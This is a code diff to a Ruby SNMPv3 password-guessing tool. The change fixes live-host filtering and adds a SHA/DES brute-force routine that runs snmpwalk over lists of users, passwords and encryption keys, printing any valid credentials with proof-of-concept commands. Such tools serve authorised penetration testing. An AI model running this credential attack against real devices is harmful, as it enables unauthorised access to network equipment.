@@ -36,16 +36,16 @@ end
 def livehosts(arg, hostfile, cmd)
   livehosts =[]
   spinner = TTY::Spinner.new("[:spinner] Checking Host Availability... ", format: :spin_2)
-  puts "\nChecking that hosts are live!".green.bold
+
+  puts "\nChecking that the hosts are live!".green.bold
   hostfile.each do |host|
     out, err = cmd.run!("snmpwalk #{host}")
     spinner.spin
-      if err =~ /snmpwalk: Timeout/
-        puts "#{host}: Timeout - Removing from host list".red.bold
-        hostfile.delete(host)
-      else
+      if err !~ /snmpwalk: Timeout/
         puts "#{host}: LIVE!".green.bold
         livehosts << host
+      else
+        puts "#{host}: Timeout - Removing from host list".red.bold
       end
     end
   spinner.success('(Complete)')
@@ -67,15 +67,12 @@ def findusers(arg, live, cmd)
         if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
           puts "FOUND: '#{user}' on #{host}".green.bold
           users << [user, host]
-        elsif err =~ /snmpwalk: Timeout/
-          puts "#{host} timeout - please remove from hosts list".red.bold
         elsif err =~ /authorizationError/i
           puts "FOUND: '#{user}' on #{host}".green.bold
           users << [user, host]
         elsif err =~ /snmpwalk: Unknown user name/i
           if arg[:showfail]
           puts "FAILED: '#{user}' on #{host}".red.bold
-        
         end
       end
     end
@@ -215,33 +212,67 @@ def authpriv_md5aes(arg, users, live, passwords, cmd, cryptopass)
   valid
 end
 
-def authpriv_shades
+def authpriv_shades(arg, users, live, passwords, cmd, cryptopass)
+  valid = []
+  valid << ["User", "Password", "Encryption", "Host"]
+  spinner = TTY::Spinner.new("[:spinner] Password Attack (SHA/DES)...", format: :spin_2)
+
+  puts "\nTesting SNMPv3 with SHA authentication and DES encryption".light_blue.bold
+  live.each do |host|
+    users.each do |user|
+      passwords.each do |password|
+        cryptopass.each do |epass|
+          if epass.length >= 8 && password.length >= 8
+            out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -a SHA -X #{epass} -x DES #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
+              if !arg[:showfail]
+                spinner.spin
+              end
+              if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
+                puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, SHA/DES".green.bold
+                puts "POC ---> snmpwalk -u #{user} -A #{password} -a SHA -X #{epass} -x DES #{host} -v3 -l authpriv".light_magenta
+                valid << [user, password, epass, host]
+              else
+                if arg[:showfail]
+                puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
+              end
+            end
+          end
+        end
+      end
+    end
+  end
+  spinner.success('(Complete)')
+  valid
 end
 
 def authpriv_shaaes
 end
 
-def print(users, no_auth, anp, ap, apaes)
+def print(users, no_auth, anp, ap, apaes, apsd)
   #need to get the user summary working to show IPs too
   puts "\nResults Summary:\n".green.bold
-  puts "Valid Users Per System:".magenta
-  puts users.to_table
+    puts "Valid Users Per System:".magenta
+      puts users.to_table
   
   puts "\nAccounts that did not require a password to connect!".magenta
-  puts "Example POC: snmpwalk -u username 10.10.10.1".light_magenta
-  puts no_auth.to_table(:first_row_is_head => true)
+    puts "Example POC: snmpwalk -u username 10.10.10.1".light_magenta
+      puts no_auth.to_table(:first_row_is_head => true)
   
   puts "\nAccount and password (No encryption configured - BAD)".magenta
-  puts "Example POC: snmpwalk -u username -A password 10.10.10.1 -v3 -l authnopriv".light_magenta
-  puts anp.to_table(:first_row_is_head => true)
+    puts "Example POC: snmpwalk -u username -A password 10.10.10.1 -v3 -l authnopriv".light_magenta
+      puts anp.to_table(:first_row_is_head => true)
   
-  puts "\nAccount and password (MD5 Auth and DES Encryption - Should use AES)".magenta
-  puts "Example POC: snmpwalk -u username -A password -X password 10.10.10.1 -v3 -l authpriv".light_magenta
-  puts ap.to_table(:first_row_is_head => true)
+  puts "\nAccount and password (MD5 Auth and DES Encryption - recommend SHA auth and AES for crypto!)".magenta
+    puts "Example POC: snmpwalk -u username -A password -X password 10.10.10.1 -v3 -l authpriv".light_magenta
+      puts ap.to_table(:first_row_is_head => true)
   
   puts "\nAccount and password (MD5 Auth and AES Encryption - Encryption OK, recommend SHA for auth!)".magenta
-  puts "Example POC: snmpwalk -u username -A password -a MD5 -X password -x AES 10.10.10.1 -v3 -l authpriv".light_magenta
-  puts apaes.to_table(:first_row_is_head => true)
+    puts "Example POC: snmpwalk -u username -A password -a MD5 -X password -x AES 10.10.10.1 -v3 -l authpriv".light_magenta
+      puts apaes.to_table(:first_row_is_head => true)
+
+  puts "\nAccount and password (SHA Auth and DES Encryption - Auth OK, recommend AES for crypto!)".magenta
+    puts "Example POC: snmpwalk -u username -A password -a SHA -X password -x DES 10.10.10.1 -v3 -l authpriv".light_magenta
+      puts apsd.to_table(:first_row_is_head => true)
 end
 
 
@@ -252,9 +283,10 @@ cryptopass = File.readlines(arg[:enclist]).map(&:chomp)
 log = Logger.new('debug.log')
 cmd = TTY::Command.new(output: log)
 live = livehosts(arg, hostfile, cmd)
-users = findusers(arg, hostfile, cmd)
-no_auth = noauth(arg, users, hostfile, cmd)
-anp = authnopriv(arg, users, hostfile, passwords, cmd)
-ap = authpriv_md5des(arg, users, hostfile, passwords, cmd, cryptopass)
-apaes = authpriv_md5aes(arg, users, hostfile, passwords, cmd, cryptopass)
-print(users, no_auth, anp, ap, apaes)
+users = findusers(arg, live, cmd)
+no_auth = noauth(arg, users, live, cmd)
+anp = authnopriv(arg, users, live, passwords, cmd)
+ap = authpriv_md5des(arg, users, live, passwords, cmd, cryptopass)
+apaes = authpriv_md5aes(arg, users, live, passwords, cmd, cryptopass)
+apsd = authpriv_shades(arg, users, live, passwords, cmd, cryptopass)
+print(users, no_auth, anp, ap, apaes, apsd)
